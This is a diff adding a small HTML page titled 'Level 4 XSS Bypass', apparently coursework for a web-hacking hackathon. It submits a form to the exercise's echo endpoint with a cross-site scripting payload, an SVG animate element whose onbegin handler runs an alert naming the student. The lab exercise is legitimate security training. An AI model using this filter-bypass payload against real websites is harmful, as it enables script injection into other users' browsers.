@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head><title>Level 4 XSS Bypass</title></head>
+<body>
+
+<form action="https://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php" method="POST" target="_blank">
+  <input type="text" name="input" value='<svg><animate attributeName="href" begin="0s" dur="0.001s" onbegin="alert(`Level4-hacked by Thanooj daggu`)"></svg>'>
+  <input type="submit" value="Submit Payload">
+</form>
+
+</body>
+</html>
